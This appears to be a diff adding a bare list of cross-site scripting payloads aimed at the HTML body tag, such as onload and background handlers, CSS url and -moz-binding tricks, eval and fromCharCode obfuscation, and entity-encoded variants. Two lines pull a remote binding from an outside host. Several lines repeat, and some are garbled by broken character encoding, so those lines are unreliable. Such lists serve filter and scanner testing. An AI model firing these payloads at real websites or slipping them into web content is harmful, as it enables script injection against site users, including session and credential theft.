@@ -1,0 +1,62 @@
+<BODY BACKGROUND="javascript:alert('XSS');">
+<BODY ONLOAD=alert('XSS')>
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
+<body onload=;;;;;;;;;;;_=alert;_(1);;;;
+<body <body onload=;;;;;al:eval('al'+'ert(1)');;>
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/â€â€$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+<style>body:after{content: â€œ\61\6c\65\72\74\28\31\29â€³}</style><script>eval(eval(document.styleSheets[0].cssRules[0].style.content))</script>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<BODY BACKGROUND=�javascript:alert(�XSS�)�>
+<BODY ONLOAD=alert(�XSS�)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body background=javascript:'"><script>alert(XSS)</script>></body>
+<form name=document><image name=body>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
